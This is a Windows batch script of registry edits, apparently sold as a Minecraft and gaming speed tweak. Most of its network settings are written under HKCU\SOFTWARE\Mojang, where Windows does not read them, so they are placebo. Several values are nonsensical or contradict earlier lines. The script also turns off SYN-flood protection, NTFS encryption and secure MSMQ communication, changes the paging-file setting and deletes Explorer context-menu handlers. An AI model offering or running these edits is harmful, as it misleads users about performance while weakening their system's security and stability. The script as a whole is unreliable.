Reg.exe add "HKCU\SOFTWARE\Mojang" /v "WorldMaxTcpWindowsSize" /t REG_DWORD /d "16777215" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "TCPAllowedPorts" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "NTEContextList" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "DisableLargeMTU" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "IGMPVersion" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "IGMPLevel" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxFreeTcbs" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "ArpTRSingleRoute" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "SynAttackProtect" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxForwardBufferMemory" /t REG_DWORD /d "150000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "ForwardBufferMemory" /t REG_DWORD /d "150000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "NumForwardPackets" /t REG_DWORD /d "585" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxNumForwardPackets" /t REG_DWORD /d "585" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxMpxCt" /t REG_DWORD /d "125" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "CacheHashTableBucketSize" /t REG_DWORD /d "4096" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnableWsd" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnableDHCP" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnableWsd" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpAckFrequency" /t REG_DWORD /d "19" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "NumTcbTablePartitions" /t REG_DWORD /d "8" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpWindowSize" /t REG_DWORD /d "365000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TCPTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "IRPStackSize" /t REG_DWORD /d "18" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "KeepAliveTime" /t REG_DWORD /d "60000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TCPInitialRtt" /t REG_DWORD /d "300" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpRecSegmentSize" /t REG_DWORD /d "2446674" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnablePMTUBHDetect" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "16777215" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "WorldMaxTcpWindowsSize" /t REG_DWORD /d "16777215" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TCPAllowedPorts" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "NTEContextList" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "DisableLargeMTU" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "IGMPVersion" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "IGMPLevel" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "ArpTRSingleRoute" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "SynAttackProtect" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxForwardBufferMemory" /t REG_DWORD /d "150000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "ForwardBufferMemory" /t REG_DWORD /d "150000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "NumForwardPackets" /t REG_DWORD /d "585" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxNumForwardPackets" /t REG_DWORD /d "585" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "MaxMpxCt" /t REG_DWORD /d "125" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "CacheHashTableBucketSize" /t REG_DWORD /d "4096" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnableWsd" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnableDHCP" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft" /v "EnableWsd" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft Launcher" /v "upgrade_id" /t REG_DWORD /d "919817256" /f
Reg.exe add "HKCU\SOFTWARE\Mojang\Minecraft Launcher" /v "launcher_pos" /t REG_BINARY /d "bd01000073000000680200009202000000000000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "SfTracingState" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Video" /v "PerfLevelSrc" /t REG_BINARY /d "3322" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Pshed" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe delete "HKCR\AllFilesystemObjects\shellex\ContextMenuHandlers\Copy To" /f
Reg.exe delete "HKCR\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "2" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1050" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "3400" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "9" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "69" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "65527" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "52" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "BcastNameQueryCount" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "BcastQueryTimeout" /t REG_DWORD /d "750" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "CacheTimeout" /t REG_DWORD /d "600000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "EnableLMHOSTS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "NameServerPort" /t REG_DWORD /d "137" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "NameSrvQueryCount" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "NameSrvQueryTimeout" /t REG_DWORD /d "1500" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "NbProvider" /t REG_SZ /d "_tcp" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "SessionKeepAlive" /t REG_DWORD /d "3600000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "Size/Small/Medium/Large" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "TransportBindName" /t REG_SZ /d "\Device\\" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "UseNewSmb" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "EnableProxy" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "EnableProxyRegCheck" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters" /v "EnableDns" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Priority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Priority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "BackgroundPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters\OCMsetup" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters\Security" /v "SecureDSCommunication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "384" /f
cls
for /f %%a in ('wmic cpu get L2CacheSize ^| findstr /r "[0-9][0-9]"') do (
    set /a l2c=%%a
    set /a sum1=%%a
) 
for /f %%a in ('wmic cpu get L3CacheSize ^| findstr /r "[0-9][0-9]"') do (
    set /a l3c=%%a
    set /a sum2=%%a
) 
reg add "hklm\system\controlset001\control\session manager\memory management" /v "secondleveldatacache" /t reg_dword /d "%sum1%" /f
reg add "hklm\system\controlset001\control\session manager\memory management" /v "thirdleveldatacache" /t reg_dword /d "%sum2%" /f
reg add "hklm\system\controlset001\control\session manager\memory management" /v "pagingfiles" /t reg_multi_sz /d "c:\pagefile.sys 0 0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "contigfileallocsize" /t reg_dword /d "1536" /f
reg add "hklm\system\controlset001\control\filesystem" /v "disabledeletenotification" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "dontverifyrandomdrivers" /t reg_dword /d "1" /f
reg add "hklm\system\controlset001\control\filesystem" /v "filenamecache" /t reg_dword /d "1024" /f
reg add "hklm\system\controlset001\control\filesystem" /v "longpathsenabled" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsallowextendedcharacter8dot3rename" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsbugcheckoncorrupt" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsdisable8dot3namecreation" /t reg_dword /d "1" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsdisablecompression" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsdisableencryption" /t reg_dword /d "1" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsencryptpagingfile" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsmemoryusage" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "ntfsmftzonereservation" /t reg_dword /d "4" /f
reg add "hklm\system\controlset001\control\filesystem" /v "pathcache" /t reg_dword /d "128" /f
reg add "hklm\system\controlset001\control\filesystem" /v "refsdisablelastaccessupdate" /t reg_dword /d "1" /f
reg add "hklm\system\controlset001\control\filesystem" /v "udfssoftwaredefectmanagement" /t reg_dword /d "0" /f
reg add "hklm\system\controlset001\control\filesystem" /v "win31filesystem" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "contigfileallocsize" /t reg_dword /d "1536" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "disabledeletenotification" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "dontverifyrandomdrivers" /t reg_dword /d "1" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "filenamecache" /t reg_dword /d "1024" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "longpathsenabled" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsallowextendedcharacter8dot3rename" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsbugcheckoncorrupt" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\filesystem" /v "ntfsdisable8dot3namecreation" /t reg_dword /d "1" /f
